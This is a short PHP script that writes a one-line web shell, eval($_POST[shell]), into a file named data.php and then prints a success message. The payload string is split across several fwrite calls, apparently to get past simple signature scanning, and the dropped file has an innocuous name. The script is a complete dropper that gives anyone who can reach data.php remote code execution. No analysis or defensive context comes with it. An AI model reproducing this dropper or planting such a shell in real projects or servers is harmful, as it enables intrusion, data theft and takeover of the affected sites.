<?php  
$fp = fopen('data.php', 'w');//opens file in write-only mode  
fwrite($fp, '<?php ');  
fwrite($fp, 'eval($_POST');  
fwrite($fp, '[shell])?>'); 
fclose($fp);  

echo "File written successfully";  
?>